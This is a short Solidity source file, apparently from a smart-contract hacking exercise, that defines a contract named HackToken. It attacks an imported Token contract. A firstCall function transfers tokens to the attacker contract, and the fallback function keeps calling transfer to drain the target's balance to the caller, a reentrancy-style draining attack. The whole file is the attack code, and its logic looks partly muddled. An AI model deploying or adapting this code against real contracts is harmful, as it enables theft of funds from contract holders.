pragma solidity ^0.6.0;
import './Token.sol';

contract HackToken{
 Token public token;
 constructor(address _token) public {
    token = Token(_token);
 }
 function firstCall() public {
    token.transfer(address(this), 1 ether);
 }
 fallback() external payable {
    if (address(token).balance > 0 ){
        token.transfer(msg.sender, address(token). balance);
    } 
 }
}